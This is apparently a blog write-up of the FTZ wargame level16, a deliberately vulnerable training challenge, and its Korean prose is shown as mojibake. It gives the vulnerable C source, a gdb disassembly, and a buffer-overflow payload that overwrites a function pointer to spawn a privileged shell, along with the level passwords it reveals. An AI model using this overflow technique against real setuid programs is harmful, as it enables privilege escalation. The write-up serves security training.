---
title: "[FTZ] level16 í’€ì´"
categories:
  - ftz
tags:
  - FTZ
toc: true
toc_sticky: true
toc_label: "level16 í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/ftz.png
---

ğŸ’¡ FTZ level16 í’€ì´
{: .notice--warning}


# ë¬¸ì œ

ê³„ì • : level16/about to cause mass

**hint**
```c
#include <stdio.h>

void shell() {
  setreuid(3097,3097);
  system("/bin/sh");
}

void printit() {
  printf("Hello there!\n");
}

main()
{ int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  call();
}
```

# í’€ì´
call ë³€ìˆ˜ì— printit í•¨ìˆ˜ì˜ ì£¼ì†Œê°€ ë“¤ì–´ìˆëŠ”ë°, ì´ë¥¼ ë®ì–´ì¨ì„œ shell()í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë„ë¡ í•˜ë©´ ì‰˜ì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìš°ì„  gdbë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.

```sh
[level16@ftz tmp]$ gdb -q attackme
(gdb) set disass intel
(gdb) disas main
Dump of assembler code for function main:
0x08048518 <main+0>:    push   ebp
0x08048519 <main+1>:    mov    ebp,esp
0x0804851b <main+3>:    sub    esp,0x38
0x0804851e <main+6>:    mov    DWORD PTR [ebp-16],0x8048500 //printit í•¨ìˆ˜ë¥¼ ì €ì¥í•˜ëŠ” ë¶€ë¶„
0x08048525 <main+13>:   sub    esp,0x4
0x08048528 <main+16>:   push   ds:0x80496e8
0x0804852e <main+22>:   push   0x30
0x08048530 <main+24>:   lea    eax,[ebp-56] //bufì˜ ìœ„ì¹˜
0x08048533 <main+27>:   push   eax
0x08048534 <main+28>:   call   0x8048384 <fgets>
0x08048539 <main+33>:   add    esp,0x10
0x0804853c <main+36>:   mov    eax,DWORD PTR [ebp-16]
0x0804853f <main+39>:   call   eax
0x08048541 <main+41>:   leave
0x08048542 <main+42>:   ret
End of assembler dump.

```

ebp-16ìœ„ì¹˜ì— call ë³€ìˆ˜ê°€ ë“¤ì–´ìˆê³  0x8048500ì£¼ì†Œë¥¼ ë„£ê³  ìˆìŠµë‹ˆë‹¤.

ê·¸ë¦¬ê³  ebp-56ì— buf ë³€ìˆ˜ê°€ ìœ„ì¹˜í•˜ê³  ìˆìŠµë‹ˆë‹¤.

í•¨ìˆ˜ë“¤ì˜ ì£¼ì†Œë¶€í„° í™•ì¸í•´ ë´…ë‹ˆë‹¤.

```sh
(gdb) b main
Breakpoint 1 at 0x804851e
(gdb) run
Starting program: /home/level16/tmp/attackme

Breakpoint 1, 0x0804851e in main ()
(gdb) p printit
$1 = {<text variable, no debug info>} 0x8048500 <printit>
(gdb) p shell
$2 = {<text variable, no debug info>} 0x80484d0 <shell>

```

í™•ì¸ ê²°ê³¼ printit í•¨ìˆ˜ì˜ ì£¼ì†ŒëŠ” 0x8048500ì´ ë§ê³ , shell í•¨ìˆ˜ì˜ ì£¼ì†ŒëŠ” 0x80484d0ì…ë‹ˆë‹¤. 

ì´ì œ bof ì·¨ì•½ì ìœ¼ë¡œ call ë³€ìˆ˜ë¥¼ ë®ì–´ì¨ ì¤ë‹ˆë‹¤.

buf ë³€ìˆ˜ì™€ call ë³€ìˆ˜ì‚¬ì´ì— 40ë°”ì´íŠ¸ê°€ ìˆìœ¼ë¯€ë¡œ, 40ë°”ì´íŠ¸ë¥¼ ì±„ìš´ë’¤ shell ë³€ìˆ˜ë¥¼ ë„£ì–´ì¤ë‹ˆë‹¤.

```sh
[level16@ftz level16]$ (python -c 'print("A"*40+"\xd0\x84\x04\x08")';cat) | ./attackme

id
uid=3097(level17) gid=3096(level16) groups=3096(level16)

my-pass
Level17 Password is "king poetic".
```

ì‰˜ì„ íšë“í–ˆìŠµë‹ˆë‹¤.


